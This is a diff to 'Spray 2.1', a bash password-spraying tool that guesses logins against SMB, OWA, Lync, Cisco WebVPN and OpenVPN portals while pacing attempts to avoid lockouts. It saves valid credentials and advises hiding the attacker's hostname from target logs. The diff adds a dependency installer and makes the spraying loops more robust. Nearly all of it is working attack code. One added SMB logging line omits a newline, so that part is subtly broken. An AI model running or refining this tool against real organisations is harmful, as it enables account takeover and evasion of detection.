@@ -4,6 +4,7 @@ echo -e "\nSpray 2.1 the Password Sprayer by Jacob Wilkin(Greenwolf)\n"
 
 if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ] ; then
     echo "This script will password spray a target over a period of time"
+    echo "Note: on macOS, rpcclient (smb mode) is provided by: brew install samba"
     echo "It requires password policy as input so accounts are not locked out"
     echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain> <OptionalSkipUsernameUsernameSpray>"
     echo "  Tip: set SPRAY_NETBIOS_NAME=<name> to control the client name the target logs (hides your droplet hostname)."
@@ -40,8 +41,70 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
     echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fn>.<ln>\""
 
     echo ""
+    echo "To install the dependencies (rpcclient/curl) for your OS (macOS/Debian/Kali):"
+    echo "Useage: spray.sh --install"
+    echo ""
     exit 0
 fi
+if [ "$1" == "--install" ] || [ "$1" == "install" ] ; then
+    os=$(uname -s)
+    echo "Installing dependencies for $os..."
+    if [ "$os" == "Darwin" ] ; then
+        if ! command -v brew >/dev/null 2>&1 ; then
+            echo "Homebrew not found. Install it from https://brew.sh, then re-run: spray.sh --install"
+            exit 1
+        fi
+        if ! command -v rpcclient >/dev/null 2>&1 ; then
+            echo "Installing samba (provides rpcclient + smbclient) via Homebrew..."
+            brew install samba
+        fi
+        if ! command -v curl >/dev/null 2>&1 ; then
+            echo "Installing curl via Homebrew..."
+            brew install curl
+        fi
+    else
+        if [ -r /etc/os-release ] && grep -qE "^ID=(debian|ubuntu|kali)" /etc/os-release ; then
+            if ! command -v rpcclient >/dev/null 2>&1 ; then
+                echo "Installing samba-common-bin (provides rpcclient)..."
+                sudo apt-get update && sudo apt-get install -y samba-common-bin
+            fi
+            if ! command -v curl >/dev/null 2>&1 ; then
+                echo "Installing curl..."
+                sudo apt-get install -y curl
+            fi
+        else
+            echo "This OS isn't auto-detected (not macOS or Debian/Ubuntu/Kali)."
+            echo "Install the dependencies manually:"
+            echo "  rpcclient  - part of the samba package (e.g. apt-get install samba-common-bin on Debian/Kali)"
+            echo "  curl       - part of the curl package"
+            exit 1
+        fi
+    fi
+    echo ""
+    echo "Checking dependencies..."
+    ok=1
+    if command -v rpcclient >/dev/null 2>&1 ; then
+        echo "  rpcclient: $(command -v rpcclient)  (smb mode)"
+    else
+        echo "  rpcclient: NOT FOUND  (smb mode unavailable)"
+        ok=0
+    fi
+    if command -v curl >/dev/null 2>&1 ; then
+        echo "  curl: $(command -v curl)  (owa/lync/cisco/ovpn modes)"
+    else
+        echo "  curl: NOT FOUND  (owa/lync/cisco/ovpn modes unavailable)"
+        ok=0
+    fi
+    if [ $ok -eq 1 ] ; then
+        echo ""
+        echo "All dependencies present. You are ready to spray."
+    else
+        echo ""
+        echo "Some dependencies are still missing (see above)."
+    fi
+    exit 0
+fi
+
 
 if [ "$1" == "-passupdate" ] || [ "$1" == "--passupdate" ] || [ "$1" == "passupdate" ] ; then
 
@@ -129,9 +192,10 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     fi
     netbiosname="${netbiosname:0:15}"
     target=$2
-    cp $3 logs/username-removed-successes.txt
+    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
     userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
+    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
+    passwordlist=logs/passwords-clean.txt
     lockout=$5
     lockoutduration=$(($6 * 60))
     counter=0
@@ -141,10 +205,13 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     if [ "$nouseruser" == "" ] ; then
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: Users Username"
-        for u in $(cat $userslist); do 
-        	(echo -n "[*] user $u%$u " && rpcclient -n "$netbiosname" -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
-        done
-        cat logs/spray-logs.txt | grep -v "Cannot"
+        while IFS= read -r u || [ -n "$u" ]; do
+            [ -n "$u" ] || continue
+        	out=$(rpcclient -n "$netbiosname" -U "$domain/$u%$u" -c "getusername;quit" $target 2>&1 | LC_ALL=C tr -d "\000-\037")
+        	echo "$u%$u -> $out"
+        	if echo "$out" | grep -q "Account Name"; then printf "SUCCESS	%s	%s" "$u" "$u" >> logs/spray-logs.txt; fi
+        done < $userslist
+        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}'
         counter=$(($counter + 1))
         if [ $counter -eq $lockout ] ; then
         	counter=0
@@ -153,18 +220,23 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     fi
 
     #Then start on list
-    while read password; do
+    while IFS= read -r password || [ -n "$password" ]; do
+        [ -n "$password" ] || continue
         time=$(date +%H:%M:%S)
     	echo "$time Spraying with password: $password"
-    	for u in $(cat $userslist); do 
-    		(echo -n "[*] user $u%$password " && rpcclient -n "$netbiosname" -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
-    	done
-        cat logs/spray-logs.txt | grep -v "Cannot"
-        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
-        for user in $(cat logs/usernamestoremove.txt); do 
-            sed -i.bak "/$user/d" $userslist
-        done
+    	while IFS= read -r u || [ -n "$u" ]; do
+    	    [ -n "$u" ] || continue
+    		out=$(rpcclient -n "$netbiosname" -U "$domain/$u%$password" -c "getusername;quit" $target 2>&1 | LC_ALL=C tr -d "\000-\037")
+    		echo "$u%$password -> $out"
+    		if echo "$out" | grep -q "Account Name"; then printf "SUCCESS	%s	%s" "$u" "$password" >> logs/spray-logs.txt; fi
+    	done < $userslist
+        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}'
+        grep "^SUCCESS" logs/spray-logs.txt | cut -d '	' -f 2 | sort -u > logs/usernamestoremove.txt
+        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}' | sort -u > logs/credentials.txt
+        while IFS= read -r user || [ -n "$user" ]; do
+            [ -n "$user" ] || continue
+            grep -v -F "$user" $userslist > $userslist.tmp && mv $userslist.tmp $userslist
+        done < logs/usernamestoremove.txt
         rm logs/usernamestoremove.txt
     	counter=$(($counter + 1))
     	if [ $counter -eq $lockout ] ; then
@@ -180,22 +252,24 @@ if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
     mkdir -p logs
     set +H
     target=$2
-    cp $3 logs/username-removed-successes.txt
+    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
     userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
+    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
+    passwordlist=logs/passwords-clean.txt
     lockout=$5
     lockoutduration=$(($6 * 60))
     postrequest=$7
     counter=0
     touch logs/spray-logs.txt
     
-    # convert line endings on POST data; required if you C&P from Burp.
-    sed -i.bak 's/.$//' $postrequest
+    # strip a trailing CR (CRLF) from the pasted request; removes \r only, not the last char of every line
+    sed -i.bak 's/\r$//' $postrequest
 
     #Initial spray for same username as password
     time=$(date +%H:%M:%S)
     echo "$time Spraying with password: Users Username"
-    for u in $(cat $userslist); do 
+    while IFS= read -r u || [ -n "$u" ]; do
+        [ -n "$u" ] || continue
         #Grep out the cookies (avoids missing javascript generated cookies)
         cookies=$(cat $postrequest | grep "Cookie:")
         #Grep out the post data and replace filler data with username/password combo
@@ -205,9 +279,9 @@ if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
         #Create target + path from target + path
         targetpath="$target$path"
         # silently follow redirctions and process additional cookies, send cookies as header, send data and output size of response, save this along with creds to log file
-        (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
+        (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | LC_ALL=C tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
         rm -f cookies.txt
-    done 
+    done < $userslist
     # Check if there are more than one type of reponse
     lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
     if [ "$lines" -ge "2" ]; then
@@ -221,35 +295,38 @@ if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
         sleep $lockoutduration
     fi
     #Then start on list
-    for password in $(cat $passwordlist); do
+    while IFS= read -r password || [ -n "$password" ]; do
+        [ -n "$password" ] || continue
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
+        while IFS= read -r u || [ -n "$u" ]; do
+            [ -n "$u" ] || continue
             cookies=$(cat $postrequest | grep "Cookie:")
             data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$password/")
             path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
             targetpath="$target$path"
-            (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
+            (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | LC_ALL=C tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
             rm -f cookies.txt
-        done   
+        done < $userslist
         lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
         if [ "$lines" -ge "2" ]; then
             lowest=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | cut -d ' ' -f 5 | head -n 1)
             cat logs/spray-logs.txt | grep "$lowest"
-            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2 | sort -u > logs/credentials.txt
+            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2- | sort -u > logs/credentials.txt
         fi
 
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
+        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
+            [ -n "$completeuser" ] || continue
             sed -i.bak "/$completeuser/d" $userslist
-        done
+        done < logs/usernamestoremove.txt
         rm logs/usernamestoremove.txt
         counter=$(($counter + 1))
         if [ $counter -eq $lockout ] ; then
             counter=0
             sleep $lockoutduration
         fi
-    done
+    done < $passwordlist
 fi
 
 #Lync Password Spraying
@@ -257,9 +334,10 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
     mkdir -p logs
     set +H
     target=$2
-    cp $3 logs/username-removed-successes.txt
+    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
     userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
+    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
+    passwordlist=logs/passwords-clean.txt
     lockout=$5
     lockoutduration=$(($6 * 60))
     postrequest=$7
@@ -286,10 +364,12 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
     fi
     
     #Then start on list
-    for password in $(cat $passwordlist); do
+    while IFS= read -r password || [ -n "$password" ]; do
+        [ -n "$password" ] || continue
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
+        while IFS= read -r u || [ -n "$u" ]; do
+            [ -n "$u" ] || continue
             access_token=$(curl -k -s --data "grant_type=password&username=$u&password=$password" $oauthaddress) 
             #access_token=""
             #echo "BREAKBREAKBREAKBREAK -------- xxXXXXX $u%$password"
@@ -300,30 +380,32 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
             else
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
-        done   
+        done < $userslist
         cat logs/spray-logs.txt | grep "Valid Credentials"
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt
 
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
+        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
+            [ -n "$completeuser" ] || continue
             sed -i.bak "/$completeuser/d" $userslist
-        done
+        done < logs/usernamestoremove.txt
         rm logs/usernamestoremove.txt
         counter=$(($counter + 1))
         if [ $counter -eq $lockout ] ; then
             counter=0
             sleep $lockoutduration
         fi
-    done
+    done < $passwordlist
 fi
 
 #CISCO Web VPN Password Spraying
 if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
     mkdir -p logs
     set +H
-    cp $3 logs/username-removed-successes.txt
+    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
     userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
+    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
+    passwordlist=logs/passwords-clean.txt
     lockout=$5
     lockoutduration=$(($6 * 60))
     postrequest=$7
@@ -335,10 +417,12 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
     targetlogout="$target/+webvpn+/webvpn_logout.html"
     
     #Then start on list
-    for password in $(cat $passwordlist); do
+    while IFS= read -r password || [ -n "$password" ]; do
+        [ -n "$password" ] || continue
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
+        while IFS= read -r u || [ -n "$u" ]; do
+            [ -n "$u" ] || continue
             cookies="webvpn=; webvpnc=; webvpn_portal=; webvpnSharePoint=; webvpnlogin=1; webvpnLang=en;"
             ciscologin=$(curl -k -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
             
@@ -349,31 +433,33 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
             rm -f cookies.txt
-        done
+        done < $userslist
 
         cat logs/spray-logs.txt | grep "Valid Credentials"
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt
 
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
+        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
+            [ -n "$completeuser" ] || continue
             sed -i.bak "/$completeuser/d" $userslist
-        done
+        done < logs/usernamestoremove.txt
         rm logs/usernamestoremove.txt
         counter=$(($counter + 1))
         if [ $counter -eq $lockout ] ; then
             counter=0
             sleep $lockoutduration
         fi
-    done
+    done < $passwordlist
 fi
 
 #OpenVPN Web Portal Password Spraying
 if [ "$1" == "-ovpn" ] || [ "$1" == "--ovpn" ] || [ "$1" == "ovpn" ] ; then
     mkdir -p logs
     set +H
-    cp $4 logs/username-removed-successes.txt
+    tr -d '\r' < $4 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
     userslist="logs/username-removed-successes.txt"
-    passwordlist=$5
+    tr -d '\r' < $5 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
+    passwordlist=logs/passwords-clean.txt
     lockout=$6
     lockoutduration=$(($7 * 60))
     postrequest=$8
@@ -384,11 +470,13 @@ if [ "$1" == "-ovpn" ] || [ "$1" == "--ovpn" ] || [ "$1" == "ovpn" ] ; then
     targetpath="$target/rest/GetUserlogin"
 
     #Then start on list
-    for password in $(cat $passwordlist); do
+    while IFS= read -r password || [ -n "$password" ]; do
+        [ -n "$password" ] || continue
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: $password"
 
-        for u in $(cat $userslist); do 
+        while IFS= read -r u || [ -n "$u" ]; do
+            [ -n "$u" ] || continue
             ovpnlogin=$(curl -k -s -L -u $u:$password $targetpath)
             
             if echo $ovpnlogin | grep -q "OpenVPN client config"; then
@@ -400,20 +488,21 @@ if [ "$1" == "-ovpn" ] || [ "$1" == "--ovpn" ] || [ "$1" == "ovpn" ] ; then
                 fi
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
-        done
+        done < $userslist
 
         cat logs/spray-logs.txt | grep "Valid Credentials"
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt
 
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
+        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
+            [ -n "$completeuser" ] || continue
             sed -i.bak "/$completeuser/d" $userslist
-        done
+        done < logs/usernamestoremove.txt
         rm logs/usernamestoremove.txt
         counter=$(($counter + 1))
         if [ $counter -eq $lockout ] ; then
             counter=0
             sleep $lockoutduration
         fi
-    done
+    done < $passwordlist
 fi
